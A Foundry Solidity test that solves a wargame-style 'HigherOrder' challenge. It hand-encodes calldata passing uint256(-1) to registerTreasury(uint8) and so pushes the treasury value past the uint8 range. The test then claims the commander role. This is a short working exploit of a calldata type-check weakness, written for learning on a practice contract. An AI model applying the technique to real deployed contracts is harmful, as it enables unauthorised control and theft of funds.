// SPDX-License-Identifier: MIT
pragma experimental ABIEncoderV2;
pragma solidity 0.6.12;

import "forge-std/Test.sol";
import "../src/HigherOrder.sol";

contract HigherOrderTest is Test {
    HigherOrder instance;

    function setUp() public {
        instance = new HigherOrder();
    }

    function test() public {
        assertEq(instance.commander(), address(0));
        assertEq(instance.treasury(), 0);

        bytes memory data = abi.encodeWithSignature(
            "registerTreasury(uint8)",
            uint256(-1)
        );

        (bool success, ) = address(instance).call(data);
        assertTrue(success);
        instance.claimLeadership();

        // 0x211c85abffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        assertEq(instance.treasury(), uint256(-1));
        assertEq(instance.commander(), address(this));

        bytes memory data2 = abi.encodeWithSignature(
            "whatIsTheMeaningOfLife()"
        );

        console.logBytes(data2);
    }
}
